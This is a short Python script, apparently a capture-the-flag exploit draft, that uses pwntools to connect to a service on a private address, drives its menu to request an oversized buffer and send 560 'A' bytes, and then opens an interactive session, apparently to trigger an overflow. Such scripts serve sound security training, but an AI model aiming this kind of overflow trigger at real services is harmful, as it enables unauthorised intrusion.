from pwn import *

s = remote('192.168.0.85',1234)
raw_input()
def pack(size):
  s.recvuntil('Command:\n')
  s.send('2\n')
  s.recvuntil('Expected:\n')
  s.send(str(size)+'\n')
def store(size,dat):
  s.recvuntil('Command:\n')
  s.send('3\n')
  s.recvuntil('length:\n')
  s.send(str(size)+'\n')
  s.recvuntil('string:\n')
  s.send(dat+'\n')
pack(131032)
store(560,'\x41'*560)
s.interactive()
